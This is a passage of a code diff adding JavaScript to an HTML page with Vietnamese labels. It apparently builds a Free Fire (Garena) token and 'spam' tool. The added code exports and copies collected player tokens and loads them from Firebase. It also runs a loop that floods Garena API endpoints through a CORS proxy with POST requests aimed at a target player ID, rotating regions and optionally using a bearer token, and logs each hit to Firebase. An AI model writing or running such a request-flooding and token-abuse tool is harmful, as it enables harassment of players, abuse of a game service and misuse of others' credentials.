+            });
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'ff_max_tokens_' + Date.now() + '.csv';
+            a.click();
+            showToast('✅ Đã xuất CSV!');
+        }
+        
+        // ============================================
+        // SPAM LOG (chạy trong browser)
+        // ============================================
+        function useTokenForSpam() {
+            if (currentToken) {
+                document.getElementById('spamToken').value = currentToken;
+                switchTab('spam');
+            }
+        }
+        
+        function addLog(msg, type) {
+            const time = new Date().toLocaleTimeString();
+            const prefix = type === 'success' ? '✅' : type === 'error' ? '❌' : type === 'spam' ? '📨' : 'ℹ️';
+            logLines.push(`[${time}] ${prefix} ${msg}`);
+            if (logLines.length > 200) logLines = logLines.slice(-100);
+            updateLogDisplay();
+        }
+        
+        function updateLogDisplay() {
+            const logArea = document.getElementById('logArea');
+            logArea.innerHTML = logLines.map(l => `<span style="color:${l.includes('✅') ? 'var(--green)' : l.includes('❌') ? 'var(--red)' : l.includes('📨') ? 'var(--purple)' : '#aaa'}">${l}</span>`).join('\n');
+            logArea.scrollTop = logArea.scrollHeight;
+            document.getElementById('spamCount').textContent = spamCount > 0 ? `(${spamCount} requests)` : '';
+        }
+        
+        function clearLogs() {
+            logLines = [];
+            spamCount = 0;
+            updateLogDisplay();
+        }
+        
+        function exportLogs() {
+            const blob = new Blob([logLines.join('\n')], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'spam_log_' + Date.now() + '.txt';
+            a.click();
+        }
+        
+        async function startSpam() {
+            const targetId = document.getElementById('spamTargetId').value.trim();
+            const token = document.getElementById('spamToken').value.trim();
+            const interval = parseFloat(document.getElementById('spamInterval').value) || 0.3;
+            const maxCount = parseInt(document.getElementById('spamMax').value) || 0;
+            
+            if (!targetId) { showToast('❌ Nhập Target Player ID!'); return; }
+            
+            spamRunning = true;
+            spamCount = 0;
+            document.getElementById('btnSpamStart').style.display = 'none';
+            document.getElementById('btnSpamStop').style.display = 'block';
+            document.getElementById('btnSpamStop').classList.add('spamming');
+            document.getElementById('spamStatus').innerHTML = '<div class="status status-info">🚀 SPAM ĐANG CHẠY...</div>';
+            
+            addLog(`🚀 Bắt đầu spam: Target=${targetId}, Max=${maxCount || '∞'}`, 'spam');
+            
+            const endpoints = [
+                '/v2/user/info', '/rest/v1/user/info', '/v2/auth/session',
+                '/rest/v1/auth/guest_login', '/v2/user/friends', '/v2/user/stats',
+                '/v2/user/inventory', '/v2/user/clan', '/v2/user/rank'
+            ];
+            const regions = ['VN', 'ID', 'TH', 'TW', 'BR', 'IN', 'SG', 'MY', 'PH'];
+            const bases = ['https://api.ff.garena.com', 'https://api.garena.com'];
+            
+            async function spamLoop() {
+                while (spamRunning && (maxCount === 0 || spamCount < maxCount)) {
+                    const base = bases[Math.floor(Math.random() * bases.length)];
+                    const endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
+                    const region = regions[Math.floor(Math.random() * regions.length)];
+                    
+                    try {
+                        const resp = await fetch('https://corsproxy.io/?' + encodeURIComponent(base + endpoint), {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'x-api-key': CONFIG.garenaApiKey,
+                                'X-Garena-Region': region,
+                                ...(token ? { 'Authorization': 'Bearer ' + token } : {})
+                            },
+                            body: JSON.stringify({
+                                uid: String(targetId),
+                                region: region,
+                                platform: 1,
+                                timestamp: Date.now()
+                            })
+                        });
+                        
+                        spamCount++;
+                        const icon = resp.ok ? '✅' : resp.status === 401 ? '⚠️' : '❌';
+                        addLog(`${icon} [${spamCount}] ${endpoint} -> ${resp.status}`, 'spam');
+                        
+                        // Save to Firebase
+                        try {
+                            const fbUrl = CONFIG.firebase.databaseURL + '/spam_logs/' + targetId + '/' + Date.now() + '.json';
+                            fetch(fbUrl, {
+                                method: 'PUT',
+                                body: JSON.stringify({
+                                    count: spamCount,
+                                    status: resp.status,
+                                    endpoint: endpoint,
+                                    region: region,
+                                    timestamp: new Date().toISOString()
+                                })
+                            });
+                        } catch (e) {}
+                        
+                    } catch (e) {
+                        spamCount++;
+                        addLog(`❌ [${spamCount}] ${e.message}`, 'spam');
+                    }
+                    
+                    await new Promise(r => setTimeout(r, interval * 1000 + Math.random() * 200));
+                }
+                
+                spamRunning = false;
+                document.getElementById('btnSpamStart').style.display = 'block';
+                document.getElementById('btnSpamStop').style.display = 'none';
+                document.getElementById('btnSpamStop').classList.remove('spamming');
+                document.getElementById('spamStatus').innerHTML = '<div class="status status-ok">✅ KẾT THÚC: ' + spamCount + ' requests</div>';
+                addLog(`🏁 Kết thúc spam: ${spamCount} requests`, 'spam');
+            }
+            
+            spamLoop();
+        }
+        
+        function stopSpam() {
+            spamRunning = false;
+            addLog('🛑 Đang dừng spam...', 'spam');
+        }
+        
+        // ============================================
+        // COPY TOKEN
+        // ============================================
+        function copyToken() {
+            if (currentToken) {
+                navigator.clipboard.writeText(currentToken).then(() => showToast('✅ Đã copy token!'));
+            }
+        }
+        
+        // ============================================
+        // INIT
+        // ============================================
+        checkUrlParams();
+        loadTokensFromFirebase();
     </script>
 </body>
-</html>
+    </html>
